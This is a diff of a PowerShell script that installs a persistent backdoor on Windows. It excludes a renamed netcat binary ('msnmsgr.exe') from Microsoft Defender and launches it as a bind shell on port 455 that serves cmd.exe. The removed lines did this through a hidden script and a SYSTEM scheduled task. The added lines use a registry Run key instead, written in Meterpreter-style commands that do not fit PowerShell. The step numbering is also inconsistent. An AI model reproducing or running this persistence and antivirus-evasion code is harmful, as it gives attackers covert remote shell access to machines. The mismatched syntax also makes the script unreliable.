@@ -49,37 +49,16 @@ if (Test-Path "$system32Path\nc.exe") {
 
 # 4/7: Setting up System Startup
 Write-Host "4/10: Setting up System Startup..."
+
+# Add an exclusion for the msnmsgr.exe file in the Windows antimalware software
 Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"
 
-$scriptContent = @'
-$ProcessName = "msnmsgr"
+# Set the program to run at startup using the Windows registry
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v msnmsgr -d 'c:\\windows\\system32\\msnmsgr.exe -Ldp 455 -e cmd.exe'
 
-# Check if the process is already running
-$Process = Get-Process | Where-Object { $_.ProcessName -eq $ProcessName }
+# Query the value in the registry to confirm it has been set
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v msnmsgr
 
-# If the process is not running, start the process
-if (-not $Process) {
-    Start-Process "C:\Windows\System32\msnmsgr.exe" -ArgumentList "-Ldp 455 -e cmd.exe"
-}
-'@
-
-# Define the script path in the user's folder and store it in a variable
-$scriptPath = "$env:USERPROFILE\script1.ps1"
-
-# Save the script content to the defined path
-Set-Content -Path $scriptPath -Value $scriptContent
-
-# Hide the script using attrib
-attrib +h $scriptPath
-
-# Check if the "nc" task already exists
-if (schtasks /query /tn "nc" 2>$null) {
-    # If the task exists, delete it
-    schtasks /delete /tn "nc" /f
-}
-
-# Create the task using the script path stored in the variable
-& schtasks /create /sc minute /mo 1 /tn "nc" /tr "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`"" /ru SYSTEM /rl HIGHEST
 
 # 5/10: Adding Firewall Rule
 Write-Host "5/10: Adding Firewall Rule..."
